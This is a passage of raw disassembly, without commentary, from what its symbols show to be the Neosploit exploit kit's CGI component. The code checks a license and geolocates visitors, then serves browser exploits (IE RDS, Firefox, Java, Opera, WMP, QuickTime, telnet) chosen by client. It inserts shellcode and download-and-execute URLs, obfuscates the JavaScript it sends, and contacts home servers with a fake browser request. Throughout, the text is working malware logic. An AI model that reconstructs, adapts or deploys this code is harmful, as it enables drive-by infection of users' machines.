call dbg.strreplace
pop edx
pop ecx
push eax
push dword [hlp2]
mov esi, eax
call dbg.strconcat
mov ebx, eax
pop eax
push dword [strx]
call sym.imp.free
mov dword [esp], esi
call sym.imp.free
pop eax
push dword [hlp2]
call sym.imp.free
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
nop
mov eax, dword [strx]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
nop
mov eax, 0x804e01f
jmp 0x804d781
mov esi, esi
test edi, edi
mov ebx, 0x804e01f
jne 0x804d773
lea esi, [esi]
mov edi, 0x804e01f
jmp 0x804d773
jmp dword [reloc.strncpy]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
cld
lea edi, [hex]
mov esi, 0x804ed34
mov ecx, 4
mov ebx, dword [arg_8h]
rep movsd dword es:[edi], dword ptr [esi]
movsb byte es:[edi], byte ptr [esi]
xor esi, esi
test ebx, ebx
mov eax, dword [arg_ch]
je 0x804de04
test eax, eax
je 0x804de04
mov ecx, ebx
lea edi, [ebx + eax]
cmp edi, ecx
jbe 0x804dd79
nop
mov dl, byte [ecx]
lea eax, [edx - 0x61]
cmp al, 0x19
jbe 0x804de1c
lea eax, [edx - 0x41]
cmp al, 0x19
jbe 0x804de1c
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x804de1c
cmp dl, 0x20
je 0x804de1c
add esi, 2
inc ecx
inc esi
cmp edi, ecx
ja 0x804dd44
sub esp, 0xc
lea eax, [esi + 1]
push eax
call dbg.xmalloc
mov ecx, ebx
add esp, 0x10
cmp edi, ecx
mov dword [buf], eax
mov esi, eax
jbe 0x804ddf4
nop
mov dl, byte [ecx]
lea eax, [edx - 0x61]
cmp al, 0x19
jbe 0x804de40
lea eax, [edx - 0x41]
cmp al, 0x19
jbe 0x804de40
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x804de40
cmp dl, 0x40
je 0x804de40
cmp dl, 0x2e
je 0x804de40
cmp dl, 0x2d
je 0x804de40
cmp dl, 0x20
je 0x804de46
mov byte [esi], 0x25
mov al, byte [ecx]
sar al, 4
and eax, 0xf
mov al, byte [ebp + eax - 0x38]
inc esi
mov byte [esi], al
movsx eax, byte [ecx]
and eax, 0xf
inc esi
mov al, byte [ebp + eax - 0x38]
mov byte [esi], al
inc ecx
inc esi
cmp edi, ecx
ja 0x804dd94
mov byte [esi], 0
mov eax, dword [buf]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov esi, esi
push eax
push ebx
push str.urlencoden__p___d_
push 6
call dbg.seterror
lea esp, [var_ch]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
cmp dl, 0x40
je 0x804dd70
cmp dl, 0x2e
je 0x804dd70
cmp dl, 0x2d
je 0x804dd70
inc ecx
inc esi
jmp 0x804dd75
mov esi, esi
mov byte [esi], dl
inc ecx
inc esi
jmp 0x804ddf0
mov byte [esi], 0x2b
inc ecx
inc esi
jmp 0x804ddf0
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edi, dword [arg_8h]
cmp dword [edi + 0x54], 0x40
mov esi, dword [arg_ch]
mov ebx, dword [arg_10h]
je 0x804ccec
test esi, esi
je 0x804cce4
mov eax, dword [edi + 0x54]
test eax, eax
je 0x804cc8e
test ebx, ebx
je 0x804cc7c
cmp eax, 0x3f
jg 0x804cc7c
lea edx, [eax + 1]
nop
mov al, byte [esi]
inc esi
dec ebx
mov byte [edx + edi + 0x13], al
mov dword [edi + 0x54], edx
mov eax, edx
je 0x804cc7c
inc edx
cmp eax, 0x3f
jle 0x804cc64
lea esi, [esi]
push eax
push 0
push 0
push edi
call dbg.md5_write
add esp, 0x10
test ebx, ebx
je 0x804cce4
cmp ebx, 0x3f
jbe 0x804ccb2
nop
mov edx, esi
mov eax, edi
call dbg.transform
sub ebx, 0x40
mov dword [edi + 0x54], 0
inc dword [edi + 0x10]
add esi, 0x40
cmp ebx, 0x3f
ja 0x804cc94
mov eax, 0x68
call dbg.burn_stack
test ebx, ebx
je 0x804cce4
mov eax, dword [edi + 0x54]
cmp eax, 0x3f
jg 0x804cce4
lea edx, [eax + 1]
nop
mov al, byte [esi]
inc esi
dec ebx
mov byte [edx + edi + 0x13], al
mov dword [edi + 0x54], edx
mov eax, edx
je 0x804cce4
inc edx
cmp eax, 0x3f
jle 0x804cccc
lea esi, [esi]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
lea edx, [edi + 0x14]
mov eax, edi
call dbg.transform
mov eax, 0x68
call dbg.burn_stack
inc dword [edi + 0x10]
mov dword [edi + 0x54], 0
jmp 0x804cc48
push ebp
mov ebp, esp
push edi
push esi
push ebx
xor ecx, ecx
mov ebx, dword [arg_10h]
cmp ecx, ebx
jae 0x804aeaa
cld
xor esi, esi
mov edx, dword [output]
lea esi, [esi]
mov edi, dword [input]
mov al, byte [edi + ecx]
mov edi, dword [output]
mov byte [edi + ecx*4], al
lea edi, [edx + 1]
mov eax, esi
inc ecx
stosw word es:[edi], ax
add edx, 4
mov eax, esi
cmp ecx, ebx
stosb byte es:[edi], al
jb 0x804ae8c
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x41c
mov eax, dword [len]
mov dword [retval], 0
xor ebx, ebx
mov dword [eax], 0
jmp 0x804a264
nop
lea edi, [ebx + esi]
sub esp, 8
lea eax, [edi + 1]
push eax
push dword [retval]
call dbg.xrealloc
add esp, 0x10
test eax, eax
mov dword [retval], eax
je 0x804a2b4
add ebx, eax
push eax
push esi
lea eax, [buf]
push eax
push ebx
call sym.imp.memcpy
mov byte [ebx + esi], 0
add esp, 0x10
mov ebx, edi
push 0
push 0x400
lea eax, [buf]
push eax
push dword [obj.fd]
call sym.imp.recv
add esp, 0x10
test eax, eax
mov esi, eax
jg 0x804a228
jne 0x804a28c
test ebx, ebx
jne 0x804a2be
sub esp, 0xc
push 3
call dbg.seterror
mov eax, dword [retval]
add esp, 0x10
test eax, eax
je 0x804a2b4
sub esp, 0xc
push dword [retval]
call sym.imp.free
add esp, 0x10
lea esp, [var_ch]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
mov eax, dword [len]
mov dword [eax], ebx
mov eax, dword [retval]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x5c
and esp, 0xfffffff0
sub esp, 0x18
xor esi, esi
cmp dword [argc], 1
mov eax, dword [argv]
jg 0x8049798
xor eax, eax
push eax
push obj.env
call dbg.env_init
mov edi, dword [0x8055fa8]
add esp, 0x10
test edi, edi
jne 0x80497c8
sub esp, 0xc
push str.This_file_can_be_runned_from_web_only_
call sym.imp.puts
lea esp, [var_ch]
pop ebx
pop esi
xor eax, eax
pop edi
leave
ret
nop
push dword [0x8055fd8]
push dword [0x8055fb0]
push dword [0x8055fb4]
push obj.myform
call dbg.form_parse
lea edi, [ebp - 0x38]
add esp, 0xc
xor eax, eax
cld
mov ecx, 8
rep stosd dword es:[edi], eax
push str.neosploit.key
push obj.env
push obj.license
call dbg.license_load
add esp, 0x10
test eax, eax
jne 0x8049828
sub esp, 0xc
push str.Content_Type:_text_html_n
call sym.imp.puts
mov dword [esp], obj.lic_bad
jmp 0x80497b8
lea esi, [esi]
sub esp, 0xc
push 0
call sym.imp.GeoIP_new
add esp, 0x10
test eax, eax
mov ebx, eax
je 0x8049857
sub esp, 8
push dword [0x8055fc0]
push eax
call sym.imp.GeoIP_country_id_by_addr
mov esi, eax
mov dword [esp], ebx
call sym.imp.GeoIP_delete
add esp, 0x10
mov edx, dword [0x8055fb0]
test edx, edx
je 0x804997c
mov al, byte [edx]
cmp al, 0x70
je 0x804997c
cmp al, 0x75
je 0x8049b6c
cmp al, 0x6c
je 0x8049b04
cmp al, 0x6f
jne 0x80497bd
sub esp, 8
push 0x804dfff
push obj.myform
call dbg.form_get_value
add esp, 0x10
test eax, eax
mov edx, eax
mov dword [p], 0
mov dword [a], 0
je 0x80498c3
push eax
lea eax, [p]
push eax
push 0x804dfb3
push edx
call sym.imp.sscanf
add esp, 0x10
mov eax, dword [p]
test eax, eax
je 0x80497bd
sub esp, 0xc
push dword [0x8055fc0]
call sym.imp.__inet_addr
add esp, 0xc
push 0
lea edx, [ebp - 0x38]
push edx
mov dword [ebp - 0x38], eax
push 0x40000000
mov eax, dword [p]
mov dword [var_2ch], eax
call dbg.client_check_data
add esp, 0x10
test eax, eax
mov dword [data], eax
je 0x80497bd
mov eax, dword [0x8055fb0]
sub esp, 0xc
inc eax
push eax
call sym.imp.atol
pop edi
mov ebx, eax
pop eax
push 0x804e001
push obj.myform
call dbg.form_get_value
add esp, 0x10
test eax, eax
mov edx, eax
je 0x8049944
lea eax, [a]
push esi
push eax
push 0x804dfb3
push edx
call sym.imp.sscanf
add esp, 0x10
cmp ebx, 6
jne 0x80497bd
mov edx, dword [data]
xor eax, eax
test byte [edx], 0x20
jne 0x8049963
mov ebx, dword [0x8055fd4]
test ebx, ebx
je 0x8049963
mov al, 1
push eax
push dword [a]
push dword [p]
push obj.env
call dbg.exp_quicktime_insert
add esp, 0x10
jmp 0x80497bd
sub esp, 0xc
push dword [0x8055fc0]
mov al, byte [0x8055fa1]
mov byte [var_33h], al
call sym.imp.__inet_addr
mov dword [ebp - 0x38], eax
mov eax, esi
mov byte [var_1ch], al
mov al, byte [obj.env]
mov dword [esp], 0
mov byte [var_34h], al
call sym.imp.time
pop ecx
pop ebx
push 0
sub esp, 0xc
push 0x804dfff
mov dword [var_20h], eax
push obj.myform
mov ax, word [0x8055fa2]
mov word [var_32h], ax
call dbg.form_get_value
add esp, 0x14
push eax
call dbg.Crc32Str
add esp, 0xc
push dword [0x8055fd4]
lea edx, [ebp - 0x38]
push edx
mov dword [var_2ch], eax
push 0x80008000
mov eax, dword [0x8055fa4]
mov dword [var_24h], eax
call dbg.client_check_data
add esp, 0x10
test eax, eax
mov dword [data], eax
je 0x80497bd
mov dl, byte [eax]
movsx eax, dl
test al, 0x20
je 0x8049ae6
test al, 8
jne 0x8049ae6
mov al, byte [obj.env]
test al, al
je 0x8049ae6
cmp al, 7
ja 0x8049ae6
mov al, byte [0x8055fa1]
cmp al, 1
je 0x8049d18
cmp al, 2
je 0x8049def
sub eax, 3
cmp al, 1
ja 0x8049ae6
push obj.data_opera_is_decoded
push 0xbced7
push 0x361
push obj.data_opera
call dbg.decode_data
mov eax, dword [data]
push dword [eax + 4]
push dword [var_24h]
push dword [var_2ch]
push obj.data_opera
call dbg.replace_env
add esp, 0x20
cmp byte [0x8055fa1], 3
mov ebx, eax
je 0x8049f3e
push ecx
push 0x804eef9
push str.__EXP_OPERA__
push ebx
call dbg.strreplace
mov ebx, eax
pop eax
pop edx
push 1
push ebx
call dbg.js_crypter_print
mov dword [esp], ebx
call sym.imp.free
add esp, 0x10
mov edx, dword [data]
mov eax, dword [edx + 4]
test eax, eax
je 0x80497bd
sub esp, 0xc
push eax
call sym.imp.free
mov eax, dword [data]
add esp, 0x10
mov dword [eax + 4], 0
jmp 0x80497bd
mov edx, dword [data]
mov eax, dword [edx + 4]
test eax, eax
je 0x80497bd
sub esp, 8
push eax
push str.Location:__s_n_n
call sym.imp.printf
jmp 0x8049aba
cmp byte [edx + 1], 0x3d
jne 0x80497bd
sub esp, 8
push 0
lea eax, [edx + 2]
push eax
call dbg.Crc32Str
add esp, 0x10
test eax, eax
mov dword [var_2ch], eax
je 0x80497bd
sub esp, 0xc
push dword [0x8055fc0]
call sym.imp.__inet_addr
mov dword [ebp - 0x38], eax
mov dword [esp], 0
call sym.imp.time
add esp, 0xc
push 0
mov dword [var_20h], eax
lea eax, [ebp - 0x38]
push eax
mov edx, esi
push 0x20008000
mov byte [var_1ch], dl
call dbg.client_check_data
add esp, 0x10
jmp 0x80497bd
mov esi, esi
sub esp, 8
lea eax, [var_2ch]
push eax
lea eax, [var_24h]
push eax
lea eax, [ip_hash]
push eax
lea eax, [var_30h]
push eax
lea eax, [var_1bh]
push eax
lea eax, [var_32h]
push eax
lea eax, [var_33h]
push eax
lea eax, [var_34h]
push eax
push str._hhu__hhu__hu__hhu__lu__u__u__u
lea eax, [edx + 1]
push eax
call sym.imp.sscanf
add esp, 0x24
push dword [0x8055fc0]
call sym.imp.__inet_addr
mov edx, esi
mov dword [esp], 0
mov dword [ebp - 0x38], eax
mov byte [var_1ch], dl
call sym.imp.time
mov dword [var_20h], eax
mov al, byte [var_33h]
dec eax
add esp, 0x10
cmp al, 3
ja 0x80497bd
mov al, byte [var_34h]
test al, al
je 0x80497bd
cmp al, 7
ja 0x80497bd
sub esp, 0xc
push dword [0x8055fc0]
call dbg.get_ip_hash
add esp, 0x10
cmp eax, dword [ip_hash]
jne 0x80497bd
push eax
push 0
lea eax, [ebp - 0x38]
push eax
push 0x40008000
call dbg.client_check_data
add esp, 0x10
test eax, eax
mov dword [data], eax
je 0x80497bd
test byte [eax], 0x20
je 0x804a018
sub esp, 8
push 0
push 0
call dbg.print_headers
mov edx, dword [data]
xor edi, edi
add esp, 0x10
test byte [edx], 0x40
je 0x804a082
mov edi, dword [edx + 4]
cld
xor eax, eax
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
sub esp, 0xc
add ecx, 0x3ff
push ecx
call dbg.xmalloc
mov edi, eax
movzx eax, word [0x8055fa2]
push eax
movzx eax, byte [0x8055fa1]
push eax
movzx eax, byte [obj.env]
push eax
push dword [var_2ch]
push dword [0x8055fc0]
mov eax, dword [data]
push dword [eax + 4]
push str._s__s__u__hhu__hhu__hu
push edi
call sym.imp.sprintf
add esp, 0x28
push 0x804e037
push edi
call sym.imp.popen
add esp, 0x10
test eax, eax
mov esi, eax
je 0x8049d02
test edi, edi
je 0x804a02a
lea ebx, [chr]
jmp 0x8049ccc
push dword [obj.__stdoutp]
push 1
push 1
push ebx
call sym.imp.fwrite
add esp, 0x10
push esi
push 1
push 1
push ebx
call sym.imp.fread
add esp, 0x10
dec eax
je 0x8049cb9
sub esp, 0xc
push dword [obj.__stdoutp]
call sym.imp.fflush
add esp, 0x10
test edi, edi
je 0x804a074
sub esp, 0xc
push esi
call sym.imp.pclose
add esp, 0x10
test edi, edi
je 0x8049abd
sub esp, 0xc
push edi
call sym.imp.free
jmp 0x8049aba
test dl, dl
mov ebx, obj.data_ie
mov ecx, 0x1f3f
mov esi, 0x41670f
mov eax, obj.data_ie_is_decoded
mov dword [len], 0xca
js 0x8049f26
push eax
push esi
push ecx
push ebx
call dbg.decode_data
push 0
push dword [var_2ch]
push 2
push obj.env
call dbg.create_exec_url
add esp, 0x20
push 0
push dword [var_2ch]
push 8
push obj.env
push 0x80000000
push 0
mov esi, eax
lea eax, [len]
push eax
push obj.main_shellcode
call dbg.shellcode_down_exec
add esp, 0x1c
push eax
push str.__SHELLCODE__
push ebx
mov edi, eax
call dbg.strreplace
add esp, 0xc
push esi
push str.__DOWNLOAD_URL__
push eax
mov ebx, eax
call dbg.strreplace
mov dword [buf], eax
mov dword [esp], ebx
call sym.imp.free
pop eax
pop edx
push 0
push str.text_html
call dbg.print_headers
mov eax, dword [data]
push dword [eax + 4]
push dword [var_24h]
push dword [var_2ch]
push dword [buf]
call dbg.replace_env
add esp, 0x18
push 0
push eax
mov ebx, eax
call dbg.js_crypter_print
pop eax
push dword [buf]
call sym.imp.free
mov dword [esp], ebx
call sym.imp.free
pop eax
push edi
jmp 0x8049d0e
push obj.data_ff_is_decoded
push 0x6b7cba
push 0x6db
push obj.data_ff
call dbg.decode_data
push 0
push dword [var_2ch]
push 6
push obj.env
push 0x80000000
push 0
lea eax, [var_40h]
push eax
push obj.main_shellcode
mov dword [var_40h], 0xca
call dbg.shellcode_down_exec
add esp, 0x2c
push eax
push str.__SHELLCODE__
push obj.data_ff
call dbg.strreplace
mov edx, dword [data]
mov ebx, eax
mov al, byte [edx]
add esp, 0x10
test al, al
mov edi, 0xb
js 0x8049f84
cmp byte [0x8055fa1], 2
je 0x8049fd1
test al, al
js 0x8049fb9
push obj.data_java_ff_is_decoded
push 0x2f57fa
push 0x297
push obj.data_java_ff
call dbg.decode_data
add esp, 0xc
push obj.data_java_ff
push str.__FIREFOX__
push ebx
call dbg.strreplace
mov esi, eax
mov edi, 0xb
mov dword [esp], ebx
call sym.imp.free
add esp, 0x10
push 0
mov edx, edi
push dword [var_2ch]
movzx eax, dl
push eax
push obj.env
push 0x80000000
push 0
lea eax, [var_40h]
push eax
push obj.main_shellcode
mov dword [var_40h], 0xca
call dbg.shellcode_down_exec
add esp, 0x1c
push eax
push str.__SHELLCODE__
push esi
call dbg.strreplace
mov ebx, eax
mov dword [esp], esi
call sym.imp.free
mov edx, dword [data]
push dword [edx + 4]
push dword [var_24h]
push dword [var_2ch]
push ebx
call dbg.replace_env
add esp, 0x18
push 1
push eax
mov esi, eax
call dbg.js_crypter_print
mov dword [esp], ebx
call sym.imp.free
mov dword [esp], esi
call sym.imp.free
jmp 0x8049aba
mov ebx, obj.data_ie_rds
mov cx, 0xce2
mov esi, 0xa709e2
mov eax, obj.data_ie_rds_is_decoded
jmp 0x8049d3b
push obj.exp_telnet_is_decoded
push 0x509110
push 0x59f
push obj.exp_telnet
call dbg.decode_data
push 0
push dword [var_2ch]
push 5
push obj.env
call dbg.create_exec_url
add esp, 0x1c
push eax
push str.__DOWNLOAD_URL__
push obj.exp_telnet
call dbg.strreplace
add esp, 0xc
push eax
jmp 0x8049a9b
push eax
push str.i__36
push str.i_36
push ebx
call dbg.strreplace
add esp, 0x10
test ebx, ebx
mov esi, eax
je 0x8049faa
sub esp, 0xc
push ebx
call sym.imp.free
add esp, 0x10
mov edx, dword [data]
mov al, byte [edx]
test al, al
mov ebx, esi
jns 0x8049e5a
push esi
push 0x804eef9
push str.__FIREFOX__
push ebx
call dbg.strreplace
mov esi, eax
jmp 0x8049eaa
cmp word [0x8055fa2], 0x5e0
jbe 0x8049e67
push obj.data_wmp_is_decoded
push 0xa2ec9d
push 0xa49
push obj.data_wmp
call dbg.decode_data
add esp, 0xc
push obj.data_wmp
push str.__FIREFOX__
push ebx
call dbg.strreplace
mov esi, eax
mov edi, 1
jmp 0x8049ea2
sub esp, 0xc
push str.Content_Length:_0_nContent_Type:_application_octet_stream_n
call sym.imp.puts
jmp 0x8049aba
push eax
push 2
push 0
push esi
call sym.imp.fseek
mov dword [esp], esi
call sym.imp.ftell
add esp, 0xc
push 0
push 0
mov ebx, eax
push esi
call sym.imp.fseek
add esp, 0x10
test ebx, ebx
jle 0x804a064
sub esp, 8
push ebx
push str.Content_Length:__ld_nContent_Type:_application_octet_stream_n_n
call sym.imp.printf
add esp, 0x10
test ebx, ebx
jne 0x8049cb4
test edi, edi
jne 0x8049cb4
sub esp, 0xc
push esi
call sym.imp.fclose
jmp 0x8049cff
sub esp, 8
push 0x804e068
mov edx, dword [data]
push dword [edx + 4]
call sym.imp.fopen
jmp 0x8049ca3
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x38
mov ebx, dword [arg_8h]
mov edi, dword [arg_10h]
push 0x804ee94
call sym.imp.getenv
add esp, 0xc
mov dword [domain], eax
push 0x100
push 0
push ebx
call sym.imp.memset
mov ecx, dword [domain]
add esp, 0x10
test ecx, ecx
je 0x804bfc4
sub esp, 8
push 0x3a
push dword [domain]
call sym.imp.strchr
add esp, 0x10
test eax, eax
je 0x804be55
mov byte [eax], 0
sub esp, 8
push 0x804eea0
push edi
call sym.imp.fopen
add esp, 0x10
test eax, eax
mov esi, eax
je 0x804bfe4
push eax
push 1
push 0x100
push ebx
call sym.imp.fread
add esp, 0x10
dec eax
je 0x804bea4
sub esp, 0xc
push 0x21
call dbg.seterror
mov dword [esp], esi
call sym.imp.fclose
xor edx, edx
lea esp, [var_ch]
pop ebx
pop esi
mov eax, edx
pop edi
leave
ret
mov esi, esi
sub esp, 8
push 4
lea eax, [ebx + 0xf4]
push eax
call dbg.Crc32Str
add esp, 0x10
cmp dword [ebx + 0xf8], eax
je 0x804bedb
sub esp, 0xc
push esi
call sym.imp.fclose
add esp, 0x10
lea esp, [var_ch]
pop ebx
pop esi
mov edx, 1
mov eax, edx
pop edi
leave
ret
mov edi, dword [domain]
mov dword [first], 0
cld
xor eax, eax
mov ecx, 0xffffffff
repne scasb al, byte es:[edi]
not ecx
dec ecx
sub esp, 0xc
mov dword [domain_len], ecx
push ecx
call sym.imp.malloc
mov dword [domain_xor], eax
xor ecx, ecx
add esp, 0x10
lea edi, [signature]
mov edx, ebx
nop
mov al, byte [edx + 0x10]
xor al, byte [edx + 0xf4]
mov byte [ebp + ecx - 0x10], al
mov al, byte [edx + 8]
xor al, byte [edx + 0xec]
mov byte [ebp + ecx - 0x14], al
mov al, byte [edx + 4]
xor al, byte [edx]
mov byte [edi + ecx], al
inc ecx
inc edx
cmp ecx, 3
jbe 0x804bf0c
mov eax, dword [ebx + 0xfc]
mov edx, dword [signature]
cmp eax, edx
je 0x804bff4
sub esp, 8
mov dword [ebx + 0xfc], edx
push 0x100
push ebx
mov edi, eax
call dbg.Crc32Str
add esp, 0x10
cmp eax, edi
mov dword [var_2ch], eax
jne 0x804c016
cmp dword [first], 1
je 0x804c060
mov eax, dword [start_time]
mov dword [ebx + 0xec], eax
xor ecx, ecx
mov eax, dword [life_time_real]
mov dword [ebx + 0xf4], eax
jmp 0x804bf9d
mov esi, esi
mov al, byte [ecx + ebx + 0x14]
mov edx, dword [domain]
xor al, byte [edx + ecx]
mov edx, dword [domain_xor]
mov byte [edx + ecx], al
inc ecx
cmp ecx, dword [domain_len]
jb 0x804bf8c
sub esp, 8
push dword [domain_len]
push dword [domain_xor]
call dbg.Crc32Str
add esp, 0x10
cmp dword [ebx + 0xf0], eax
mov edx, 1
je 0x804be98
sub esp, 8
push 0
push str.text_html
call dbg.print_headers
mov dword [esp], str.bad_domain
call sym.imp.printf
jmp 0x804be96
sub esp, 8
push edi
push 8
call dbg.seterror
jmp 0x804be96
mov dword [first], 1
push edx
push 0
push ebx
push dword [penv]
call dbg.connect_to_homeserver
add esp, 0x10
test eax, eax
je 0x804c036
mov edx, dword [signature]
jmp 0x804bf46
sub esp, 8
push 0
push str.text_html
call dbg.print_headers
mov dword [esp], str.bad_domain
call sym.imp.printf
jmp 0x804be8e
sub esp, 8
mov dword [ebx + 0xfc], 0
push 0
push str.text_html
call dbg.print_headers
mov dword [esp], str.signature_is_bad_
call sym.imp.printf
jmp 0x804be8e
push eax
push 0
push 0
push esi
call sym.imp.fseek
mov eax, dword [var_2ch]
mov dword [ebx + 0xfc], eax
push esi
push 1
push 0x100
push ebx
call sym.imp.fwrite
add esp, 0x14
push esi
call sym.imp.fclose
add esp, 0x10
jmp 0x804bf74
push ebp
mov ebp, esp
sub esp, 0x10
call dbg.geterror
push eax
push str.error:__s_n
call sym.imp.printf
leave
ret
mov eax, dword [obj.last_errstr]
push ebp
test eax, eax
mov ebp, esp
jne 0x804a9a0
mov eax, dword [obj.last_errno]
mov eax, dword [eax*4 + obj.errors]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x145c
xor esi, esi
sub esp, 0xc
push dword [esi*4 + obj.neosploit_hosts]
mov dword [ret], 0
mov word [sin.sin_len], 0x5000
mov byte [var_1027h], 2
call dbg.resolve_host
add esp, 0x10
test eax, eax
mov dword [var_1024h], eax
jne 0x804c310
inc esi
je 0x804c2ca
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
push ecx
push 6
push 1
push 2
call sym.imp.socket
add esp, 0x10
cmp eax, 0xffffffff
mov dword [fd], eax
je 0x804c300
cmp eax, dword [obj.high_sock]
jle 0x804c337
mov dword [obj.high_sock], eax
sub esp, 0xc
push 4
lea eax, [n]
push eax
push 4
push 0xffff
push dword [fd]
mov dword [n], 0
call sym.imp.setsockopt
add esp, 0x14
push dword [fd]
call dbg.setnonblocking
add esp, 0xc
push 0x10
lea eax, [ebp - 0x1028]
push eax
push dword [fd]
call sym.imp.connect
add esp, 0xc
push 0x100
push dword [pdata]
lea ebx, [buf_lic]
push ebx
call sym.imp.memcpy
pop eax
pop edx
push 0x100
push ebx
call dbg.urlencoden
mov edi, eax
pop eax
push dword [esi*4 + obj.neosploit_hosts]
push edi
mov eax, dword [penv]
push dword [eax + 0x1c]
push str.GET__cgi_bin_update.cgi_actionget_newsserver_slicense_s_HTTP_1.0_r_nHost:__s_r_nAccept:_image_gif__image_x_xbitmap__image_jpeg__image_pjpeg__application_vnd.ms_powerpoint__application_vnd.ms_excel__application_msword__application_x_shockwave_flash____r_nAccept_Language:_en_r_nUser_Agent:_Mozilla_4.0__compatible__MSIE_6.0__Windows_NT__DigExt__r_nPragma:_no_cache_r_n_r_n
lea edx, [buf]
push edx
call sym.imp.sprintf
add esp, 0x20
push 5
xor eax, eax
cld
mov ecx, 0xffffffff
lea edi, [buf]
repne scasb al, byte es:[edi]
not ecx
dec ecx
push ecx
lea ecx, [buf]
push ecx
push dword [fd]
call dbg.async_write
add esp, 0x10
test eax, eax
jg 0x804c412
sub esp, 0xc
push dword [fd]
call sym.imp.close
add esp, 0x10
jmp 0x804c300
mov dword [tlen], 0
xor edi, edi
jmp 0x804c457
mov ebx, dword [tlen]
sub esp, 8
add ebx, esi
push ebx
push edi
call sym.imp.realloc
add esp, 0xc
push esi
mov edx, dword [tlen]
lea ecx, [buf]
push ecx
mov edi, eax
lea eax, [eax + edx]
push eax
call sym.imp.memcpy
mov dword [tlen], ebx
add esp, 0x10
push 5
push 0x1000
lea eax, [buf]
push eax
push dword [fd]
call dbg.async_read
add esp, 0x10
test eax, eax
mov esi, eax
jg 0x804c420
sub esp, 0xc
push dword [fd]
call sym.imp.close
add esp, 0x10
test edi, edi
je 0x804c57a
sub esp, 8
push str._r_n_r_n
push edi
call sym.imp.strstr
add esp, 0x10
test eax, eax
mov dword [ptr], eax
je 0x804c585
mov byte [eax], 0
add eax, 4
mov dword [ptr], eax
sub esp, 8
push str.Tag_Id:_
push edi
call sym.imp.strstr
add esp, 0x10
test eax, eax
mov esi, eax
je 0x804c568
add esi, 8
mov dword [i], 0
mov al, byte [esi]
cmp al, 0xd
je 0x804c568
cmp al, 0xa
je 0x804c568
mov dl, byte [esi + 1]
cmp dl, 0xa
je 0x804c568
cmp dl, 0xd
je 0x804c568
mov dl, al
mov byte [hex], dl
mov edx, dword [i]
mov al, byte [esi + edx*2 + 1]
mov byte [var_1447h], al
push eax
push 0x10
push 0
lea ecx, [hex]
push ecx
lea ebx, [ret]
sub ebx, edx
mov byte [var_1446h], 0
call sym.imp.strtoul
mov byte [ebx + 3], al
inc dword [i]
add esp, 0x10
cmp dword [i], 3
jg 0x804c568
mov eax, dword [i]
mov dl, byte [esi + eax*2]
cmp dl, 0xd
je 0x804c568
cmp dl, 0xa
je 0x804c568
mov al, byte [esi + eax*2 + 1]
cmp al, 0xa
je 0x804c568
cmp al, 0xd
jne 0x804c4fe
cmp dword [show], 1
je 0x804c5ab
sub esp, 0xc
push edi
call sym.imp.free
add esp, 0x10
mov eax, dword [ret]
jmp 0x804c305
sub esp, 8
push 0x804e01d
push edi
call sym.imp.strstr
add esp, 0x10
test eax, eax
mov dword [ptr], eax
je 0x804c5d7
mov byte [eax], 0
add eax, 2
jmp 0x804c4b7
mov eax, dword [ptr]
sub eax, edi
push dword [obj.__stdoutp]
sub dword [tlen], eax
push dword [tlen]
push 1
push dword [ptr]
call sym.imp.fwrite
add esp, 0x10
jmp 0x804c56e
mov dword [ptr], edi
jmp 0x804c4bd
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x18
mov edx, dword [buffsize]
mov eax, dword [edx]
lea edx, [eax + eax*2]
shr eax, 4
lea eax, [eax + eax*4]
lea eax, [edx + eax*2 + 0x400]
push eax
call dbg.xmalloc
mov edx, dword [buffsize]
mov ebx, eax
mov eax, dword [edx]
lea edx, [eax + eax*2]
shr eax, 4
lea eax, [eax + eax*4]
add esp, 0xc
lea eax, [edx + eax*2 + 0x400]
push eax
push 0
push ebx
call sym.imp.memset
mov eax, dword [buffsize]
mov edi, dword [eax]
xor esi, esi
add esp, 0x10
test edi, edi
jne 0x804d0a7
jmp 0x804d0cc
nop
cld
mov ecx, 0xffffffff
mov edi, ebx
xor eax, eax
repne scasb al, byte es:[edi]
not ecx
mov dword [ecx + ebx - 1], 0xa2b2022
mov word [ecx + ebx + 3], 0x22
lea esi, [esi]
mov eax, esi
mov edx, dword [lpBuff]
shr eax, 1
push ecx
movzx eax, word [edx + eax*2]
push eax
push str.__u_0.4x
xor eax, eax
cld
mov ecx, 0xffffffff
mov edi, ebx
repne scasb al, byte es:[edi]
not ecx
lea ecx, [ecx + ebx - 1]
push ecx
call sym.imp.sprintf
add esi, 2
mov edx, dword [buffsize]
add esp, 0x10
cmp dword [edx], esi
jbe 0x804d0cc
test esi, 0xf
jne 0x804d070
test esi, esi
jne 0x804d050
cld
mov ecx, 0xffffffff
mov edi, ebx
xor eax, eax
repne scasb al, byte es:[edi]
not ecx
mov word [ecx + ebx - 1], 0x22
jmp 0x804d070
mov esi, esi
mov edx, 0xffffffff
xor eax, eax
mov edi, ebx
cld
mov ecx, edx
repne scasb al, byte es:[edi]
not ecx
mov byte [ecx + ebx - 1], 0x22
mov edi, ebx
mov ecx, edx
repne scasb al, byte es:[edi]
not ecx
mov eax, dword [buffsize]
dec ecx
mov dword [eax], ecx
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x68
mov ebx, dword [arg_8h]
cld
xor eax, eax
